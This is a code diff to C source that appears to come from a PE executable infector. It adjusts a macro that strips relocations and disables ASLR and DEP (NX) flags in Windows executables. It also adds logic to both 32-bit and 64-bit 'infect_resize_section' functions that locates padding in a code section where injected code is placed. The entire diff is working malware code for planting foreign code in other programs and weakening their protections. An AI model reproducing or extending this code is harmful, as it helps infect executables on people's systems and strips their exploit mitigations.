@@ -7,12 +7,12 @@
 
 
 #define DISABLE_DEP_ASLR nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_CAN_MOVE; \
-	nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED; \
-	if (!(nt_header->nt_file_header.characteristics & IMAGE_FILE_DLL)) { \
-	nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0; \
-	nt_header->nt_optional_header.data_directories.relocation_directory_size = 0; \
-	} \
-	nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
+						nt_header->nt_file_header.characteristics = nt_header->nt_file_header.characteristics | IMAGE_RELOCS_STRIPPED; \
+						if (!(nt_header->nt_file_header.characteristics & IMAGE_FILE_DLL)) { \
+							nt_header->nt_optional_header.data_directories.relocation_directory_rva = 0; \
+							nt_header->nt_optional_header.data_directories.relocation_directory_size = 0; \
+						} \
+						nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
 
 
 
@@ -574,6 +574,19 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 		//cannot allocate memory for new data
 		return -4;
 	}
+
+	//search the best place
+	while (
+			*(codeSect->data + injection_xcode_offset - 0) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 1) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 2) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 3) == 0x00
+		) 
+	{
+		injection_xcode_offset -= 4;
+	}
+
+	injection_xcode_offset += 8;
 	
 	//align another sections (if it need)
 	curSect = sections;
@@ -690,6 +703,23 @@ int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sect
 		//cannot allocate memory for new data
 		return -4;
 	}
+
+	//search the best place
+	while (
+			*(codeSect->data + injection_xcode_offset - 0) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 1) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 2) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 3) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 4) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 5) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 6) == 0x00 &&
+			*(codeSect->data + injection_xcode_offset - 7) == 0x00
+		) 
+	{
+		injection_xcode_offset -= 8;
+	}
+
+	injection_xcode_offset += 16;
 	
 	//align another sections (if it need)
 	curSect = sections;
